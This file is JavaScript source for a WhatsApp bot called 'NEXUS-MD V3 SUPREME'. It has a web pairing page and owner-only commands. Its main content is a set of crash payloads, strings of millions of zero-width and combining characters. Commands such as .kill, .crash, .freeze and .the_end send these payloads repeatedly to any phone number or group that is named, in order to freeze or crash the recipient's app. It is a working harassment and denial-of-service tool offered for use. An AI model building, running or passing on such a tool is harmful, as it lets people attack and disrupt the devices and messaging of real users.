const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const express = require('express');

const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";
const AD_IMAGE_URL = "https://telegra.ph/file/a8a183d25667e41793741.jpg";

let botConfig = {
    botName: "NEXUS-MD V3 SUPREME",
    owner: "94767475809", // Your Number
    prefix: ".",
};

// --- 🌐 SUPREME WEB PAIRING UI ---
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>NEXUS V3 WEB</title>
                <style>
                    body { background: radial-gradient(circle, #050505 0%, #000 100%); color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
                    .box { border: 1px solid #0f0; padding: 40px; display: inline-block; box-shadow: 0 0 25px #0f0; background: rgba(0,255,0,0.02); border-radius: 5px; }
                    input { padding: 15px; width: 300px; background: #000; border: 1px solid #0f0; color: #0f0; font-size: 18px; outline: none; margin-bottom: 20px; }
                    button { padding: 15px 30px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold; font-size: 16px; text-transform: uppercase; }
                    button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
                    #res { font-size: 40px; margin-top: 30px; color: #ff0055; font-weight: bold; text-shadow: 0 0 10px #ff0055; letter-spacing: 5px; }
                </style>
            </head>
            <body>
                <div class="box">
                    <h1>☣️ NEXUS SUPREME WEB ☣️</h1>
                    <p>ENTER NUMBER WITH 94 CODE</p>
                    <input type="text" id="num" placeholder="947xxxxxxxx"><br>
                    <button onclick="g()">GET PAIRING CODE</button>
                    <div id="res"></div>
                </div>
                <script>
                    async function g() {
                        const n = document.getElementById('num').value;
                        document.getElementById('res').innerText = "GENERATING...";
                        const r = await fetch('/code?num=' + n);
                        const d = await r.json();
                        document.getElementById('res').innerText = d.code || "FAILED!";
                    }
                </script>
            </body>
        </html>
    `);
});

// --- ⚙️ BOT CORE ---
async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS("Desktop"),
        syncFullHistory: false
    });

    app.get('/code', async (req, res) => {
        let num = req.query.num;
        try {
            let code = await sock.requestPairingCode(num.trim());
            res.json({ code: code });
        } catch (e) { res.json({ error: "Fail" }); }
    });

    app.listen(PORT, () => console.log(`Server Online: ${PORT}`));

    // --- 💀 BUG PAYLOADS (3,000,000+ POWER) ---
    const p_kill = "☠️ *WHITE SCREEN KILLER* ☠️\n" + "​".repeat(2500000);
    const p_crash = "🔥 *SYSTEM LAGGER* 🔥\n" + "҉".repeat(600000) + "ꦿ".repeat(600000);
    const p_destroy = "💀 *MEMORY OVERFLOW* 💀\n" + "⚰️".repeat(400000) + "᥋".repeat(800000);
    const p_freeze = "❄️ *UI FREEZER* ❄️\n" + "​".repeat(1500000) + "ꦿ".repeat(900000);
    const p_the_end = "🌌 *FINAL DESTRUCTION* 🌌\n" + "​".repeat(2000000) + "ꦿ".repeat(1000000) + "🔥".repeat(500000);

    // --- 📩 MESSAGE HANDLER ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message || mek.key.fromMe) return;
            const from = mek.key.remoteJid;
            const isOwner = from.startsWith(botConfig.owner);
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
            const targetJid = targetNum + "@s.whatsapp.net";

            switch (command) {
                case 'menu':
                    const heavyMenu = `
╭━━━━━━━━━━━━━━━━━━━━━━╮
┃  ☣️ *NEXUS-MD V3 ELITE* ☣️  ┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
┃
┃ 🩸 *POWER:* \`3,000,000+\`
┃ ⚡ *TYPE:* _System Destroyer_
┃ 💻 *DEV:* _Sasiya MD_
┃
┣━━━━━━━━━━━━━━━━━━━━━━╮
┃  🔥 *K I L L E R  M O D E S*
┣━━━━━━━━━━━━━━━━━━━━━━╯
┃ 
┃ ☠️ *.kill* [num] - _White Screen_
┃ 🔥 *.crash* [num] - _System Lag_
┃ 💀 *.destroy* [num] - _RAM Overflow_
┃ ❄️ *.freeze* [num] - _UI Lock_
┃ 🌀 *.wipe* [jid] - _Group Death_
┃ 🌌 *.the_end* [num] - _Final Crash_
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯`;
                    await sock.sendMessage(from, { text: heavyMenu }, { quoted: mek });
                    break;

                case 'kill':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "⚪ *SENDING WHITE SCREEN BUG...*" });
                    for(let i=0; i<15; i++) { await sock.sendMessage(targetJid, { text: p_kill }); await delay(200); }
                    break;

                case 'crash':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "🔥 *DEPLOYING SYSTEM LAGGER...*" });
                    for(let i=0; i<15; i++) { await sock.sendMessage(targetJid, { text: p_crash }); await delay(200); }
                    break;

                case 'destroy':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "💀 *INITIATING RAM OVERFLOW...*" });
                    for(let i=0; i<20; i++) { await sock.sendMessage(targetJid, { text: p_destroy }); await delay(150); }
                    break;

                case 'freeze':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "❄️ *LOCKING TARGET UI...*" });
                    for(let i=0; i<15; i++) { await sock.sendMessage(targetJid, { text: p_freeze }); await delay(200); }
                    break;

                case 'wipe':
                    const gJid = args[0];
                    if (!gJid) return;
                    await sock.sendMessage(from, { text: "🌀 *WIPING GROUP DATA...*" });
                    for(let i=0; i<25; i++) { await sock.sendMessage(gJid, { text: p_the_end }); await delay(300); }
                    break;

                case 'the_end':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "🌌 *EXECUTING FINAL DESTRUCTION...*" });
                    for(let i=0; i<30; i++) { await sock.sendMessage(targetJid, { text: p_the_end }); await delay(100); }
                    await sock.sendMessage(from, { text: "✅ *TARGET IS DEAD.*" });
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => { if (up.connection === 'close') startNexus(); });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
